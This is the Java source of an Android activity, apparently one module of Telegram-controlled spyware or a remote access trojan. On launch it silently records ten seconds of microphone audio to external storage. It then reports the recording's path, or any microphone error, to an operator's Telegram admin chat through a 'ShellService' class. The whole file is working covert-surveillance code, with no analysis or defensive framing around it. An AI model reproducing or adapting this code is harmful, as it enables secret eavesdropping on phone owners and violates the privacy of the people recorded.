package com.java.panel;

import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;

public class MicActivity extends AppCompatActivity {

    private MediaRecorder recorder;
    private String filePath;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
        if (!dir.exists()) dir.mkdirs();

        filePath = dir.getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".3gp";
        
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(filePath);
            recorder.prepare();
            recorder.start();

            // 10 saniye sonra kaydı durdur
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                stopRecording();
                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "🎤 Ses kaydı tamamlandı: " + filePath);
                }
                finish();
            }, 10000);

        } catch (Exception e) {
            e.printStackTrace();
            if (ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Mikrofon hatası: " + e.getMessage());
            }
            finish();
        }
    }

    private void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
